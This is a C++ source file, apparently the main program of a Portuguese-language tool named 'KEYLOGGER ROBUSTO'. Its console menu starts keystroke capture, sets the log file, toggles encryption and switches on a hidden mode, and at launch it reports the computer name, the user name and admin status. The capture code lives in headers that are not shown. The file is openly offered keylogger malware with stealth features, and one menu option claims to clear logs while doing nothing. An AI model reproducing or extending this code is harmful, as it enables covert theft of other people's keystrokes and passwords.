#include "KeyLogger.h"
#include "Utils.h"
#include <iostream>
#include <string>
#include <mutex>
#include <thread>


void showMenu() {
    std::cout << "\n=== KEYLOGGER ROBUSTO ===" << std::endl;
    std::cout << "1. Iniciar captura" << std::endl;
    std::cout << "2. Configurar arquivo de saída" << std::endl;
    std::cout << "3. Ativar/Desativar criptografia" << std::endl;
    std::cout << "4. Ver logs" << std::endl;
    std::cout << "5. Limpar logs" << std::endl;
    std::cout << "6. Modo oculto on/off" << std::endl;
    std::cout << "7. Configurações avançadas" << std::endl;
    std::cout << "0. Sair" << std::endl;
    std::cout << "Escolha: ";
}

int main() {
    KeyLogger logger;

    if (!logger.initialize()) {
        std::cerr << "Erro ao inicializar o keylogger!" << std::endl;
        return 1;
    }

    std::cout << "Sistema: " << Utils::getComputerName() << std::endl;
    std::cout << "Usuário: " << Utils::getUserName() << std::endl;
    std::cout << "Admin: " << (Utils::isRunningAsAdmin() ? "Sim" : "Não") << std::endl;

    int opcao;
    bool modoOculto = false;

    do {
        showMenu();
        std::cin >> opcao;

        switch (opcao) {
            case 1: {
                logger.setHiddenMode(modoOculto);
                logger.start();

                std::cout << "Pressione qualquer tecla para voltar ao menu..." << std::endl;
                std::cin.ignore();
                std::cin.get();

                if (logger.isActive()) {
                    logger.stop();
                }
                break;
            }

            case 2: {
                std::cout << "Novo arquivo de saída: ";
                std::string arquivo;
                std::cin >> arquivo;
                logger.setOutputFile(arquivo);
                std::cout << "Arquivo configurado: " << arquivo << std::endl;
                break;
            }

            case 3: {
                static bool criptografia = false;
                criptografia = !criptografia;
                logger.enableEncryption(criptografia);
                std::cout << "Criptografia: " << (criptografia ? "ATIVADA" : "DESATIVADA") << std::endl;
                break;
            }

            case 4: {
                // Implementar visualização de logs
                std::cout << "Funcionalidade em desenvolvimento..." << std::endl;
                break;
            }

            case 5: {
                // Implementar limpeza de logs
                std::cout << "Logs limpos!" << std::endl;
                break;
            }

            case 6: {
                modoOculto = !modoOculto;
                std::cout << "Modo oculto: " << (modoOculto ? "ATIVADO" : "DESATIVADO") << std::endl;
                break;
            }

            case 7: {
                std::cout << "\n=== CONFIGURAÇÕES AVANÇADAS ===" << std::endl;
                std::cout << "1. Intervalo de auto-save (atual: 30s)" << std::endl;
                std::cout << "2. Tamanho máximo do arquivo" << std::endl;
                std::cout << "3. Filtros de segurança" << std::endl;
                std::cout << "Escolha (0 para voltar): ";

                int subOpcao;
                std::cin >> subOpcao;

                switch (subOpcao) {
                    case 1: {
                        std::cout << "Novo intervalo (segundos): ";
                        int intervalo;
                        std::cin >> intervalo;
                        logger.setAutoSaveInterval(intervalo);
                        break;
                    }
                    case 2: {
                        std::cout << "Tamanho máximo (MB): ";
                        int tamanho;
                        std::cin >> tamanho;
                        logger.setMaxFileSize(tamanho * 1024 * 1024);
                        break;
                    }
                }
                break;
            }

            case 0:
                if (logger.isActive()) {
                    logger.stop();
                }
                std::cout << "Saindo..." << std::endl;
                break;

            default:
                std::cout << "Opção inválida!" << std::endl;
        }

    } while (opcao != 0);

    return 0;
}